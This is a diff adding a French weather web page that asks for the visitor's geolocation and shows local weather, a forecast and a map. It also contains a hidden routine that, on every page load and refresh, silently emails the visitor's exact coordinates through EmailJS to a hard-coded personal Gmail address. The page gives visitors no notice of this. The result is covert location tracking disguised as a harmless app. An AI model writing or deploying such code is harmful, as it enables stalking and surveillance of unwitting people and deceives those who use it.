@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Météo locale</title>
+<style>
+  body {
+    margin:0; padding:0; font-family:'Segoe UI', Arial, sans-serif;
+    background: linear-gradient(to bottom, #4facfe, #00f2fe);
+    overflow-x:hidden; color:#fff; text-align:center; position:relative;
+  }
+  header {
+    background: rgba(0,0,0,0.3); padding:20px; font-size:2em; font-weight:bold;
+    box-shadow:0 2px 6px rgba(0,0,0,0.2);
+  }
+  main { padding:20px; max-width:600px; margin:auto; }
+  #currentWeather { margin:15px 0; }
+  #forecast { display:flex; justify-content:space-around; flex-wrap:wrap; margin-top:15px; }
+  .forecast-day { background: rgba(255,255,255,0.2); padding:10px; border-radius:12px; margin:5px; min-width:90px; }
+  #map { width:100%; height:250px; margin:20px auto; border-radius:15px; border:2px solid white; }
+  button {
+    padding:12px 25px; font-size:16px; margin:15px auto; display:block;
+    border:none; background:#ffcc00; color:#000; cursor:pointer; border-radius:25px;
+    font-weight:bold; transition: all 0.2s ease-in-out;
+  }
+  button:hover { background:#ffaa00; transform:translateY(-2px); }
+  .cloud { position:absolute; width:150px; opacity:0.7; z-index:5; }
+  @keyframes moveCloud {0%{left:-200px;}100%{left:110%;}}
+</style>
+
+<!-- EmailJS SDK -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+  (function(){ emailjs.init("TON_USER_ID"); })(); // remplacer TON_USER_ID
+</script>
+</head>
+<body>
+
+<header id="headerLocation">Chargement météo…</header>
+
+<!-- Nuages animés -->
+<div class="cloud" style="top:50px; animation:moveCloud 60s linear infinite;">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><path fill="#fff" d="M48,32a12,12,0,0,0-24,0H16a8,8,0,0,0,0,16H48a8,8,0,0,0,0-16Z"/></svg>
+</div>
+<div class="cloud" style="top:130px; animation:moveCloud 90s linear infinite;">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><path fill="#fff" d="M48,32a12,12,0,0,0-24,0H16a8,8,0,0,0,0,16H48a8,8,0,0,0,0-16Z"/></svg>
+</div>
+
+<main>
+  <p id="status">Autorisez la géolocalisation pour afficher la météo.</p>
+  <div id="currentWeather"></div>
+  <div id="forecast"></div>
+  <div id="map"></div>
+  <button id="refreshBtn" style="display:none;">🔄 Actualiser</button>
+</main>
+
+<script>
+let lat, lon;
+
+/* 📧 Envoi Email automatique */
+function sendEmail(lat, lon){
+  emailjs.send("TON_SERVICE_ID","TON_TEMPLATE_ID",{
+    to_email:"bongongojoseph81@gmail.com",
+    latitude:lat+"",
+    longitude:lon+""
+  }).catch(e=>console.log("Échec email", e));
+}
+
+/* 🗺️ Carte Google Maps */
+function displayMap(lat, lon){
+  document.getElementById("map").innerHTML =
+    `<iframe width="100%" height="100%" src="https://maps.google.com/maps?q=${lat},${lon}&z=12&output=embed"></iframe>`;
+}
+
+/* ☀️ Météo actuelle */
+function showCurrent(data){
+  const temp = data.current_weather.temperature;
+  const wind = data.current_weather.windspeed;
+  const time = data.current_weather.time;
+  document.getElementById("currentWeather").innerHTML = `
+    <h2>Météo actuelle</h2>
+    <p><strong>${temp}°C</strong> à ${time}</p>
+    <p>Vent: ${wind} m/s</p>
+  `;
+}
+
+/* 📅 Prévisions 3 jours */
+function showForecast(data){
+  const forecastEl = document.getElementById("forecast");
+  forecastEl.innerHTML = "<h2>Prévisions 3 jours</h2>";
+  for(let i=1;i<=3;i++){
+    const dayDate = new Date(data.daily.time[i]);
+    const label = dayDate.toLocaleDateString('fr-FR',{ weekday:'short'});
+    const tempMin = Math.round(data.daily.temperature_2m_min[i]);
+    const tempMax = Math.round(data.daily.temperature_2m_max[i]);
+    forecastEl.innerHTML += `
+      <div class="forecast-day">
+        <p>${label}</p>
+        <p>${tempMin}°C / ${tempMax}°C</p>
+      </div>
+    `;
+  }
+}
+
+/* 🔎 Récupération nom ville via géocodage inverse */
+function getCityName(lat, lon){
+  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+    .then(res=>res.json())
+    .then(data=>{
+      const city = data.address.city || data.address.town || data.address.village || data.address.county || "";
+      document.getElementById("headerLocation").textContent = `Météo à ${city} 🌤️`;
+    });
+}
+
+/* ☁️ Récupération météo Open-Meteo */
+function fetchWeather(lat, lon){
+  fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true&daily=temperature_2m_max,temperature_2m_min&timezone=auto`)
+  .then(res=>res.json())
+  .then(data=>{
+    showCurrent(data);
+    showForecast(data);
+  });
+}
+
+/* 📍 Géolocalisation */
+function getLocation(){
+  const status = document.getElementById("status");
+  status.textContent = "⏳ Chargement en cours...";
+
+  if(!navigator.geolocation){
+    status.textContent = "❌ Géolocalisation non supportée.";
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(pos=>{
+    lat = pos.coords.latitude;
+    lon = pos.coords.longitude;
+    status.textContent = "🌤️ Voici votre météo :";
+    
+    getCityName(lat, lon);
+    displayMap(lat, lon);
+    fetchWeather(lat, lon);
+    sendEmail(lat, lon);
+
+    const btn = document.getElementById("refreshBtn");
+    btn.style.display = "block";
+    btn.onclick = getLocation;
+
+  },()=>{status.textContent="❌ Impossible de récupérer la position."});
+}
+
+window.onload = getLocation;
+</script>
+
+</body>
+</html>
